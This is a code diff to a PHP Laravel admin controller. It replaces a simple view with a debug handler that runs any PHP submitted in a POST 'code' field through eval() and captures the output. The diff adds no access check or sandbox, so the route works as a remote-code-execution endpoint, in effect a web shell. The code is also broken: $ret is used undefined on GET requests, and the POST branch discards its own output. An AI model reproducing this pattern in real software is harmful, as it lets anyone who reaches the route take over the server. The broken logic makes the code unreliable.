@@ -20,9 +20,28 @@ class AdminController extends Controller
      *
      * @return \Illuminate\Http\Response
      */
-    public function index()
+    public function index(Request $request)
     {
-        return view('course.index');
+        if($request->isMethod('post')){
+            $request->flash();
+            $code='<?php '.$request->get('code');
+            ob_start();
+            //require $directory.$codeFileName;
+            try{
+                eval($request->get('code'));
+            }catch(\Exception $e){
+                echo $e->getMessage(); //echo $e;
+            }
+            $ret=ob_get_contents();
+            ob_end_clean();
+            return view('run.index',[
+            ]);
+
+        }
+        return view('admin.debug',[
+            'ret'=>$ret,
+            'code'=>$request->get('code')
+        ]);
     }
 
     /**
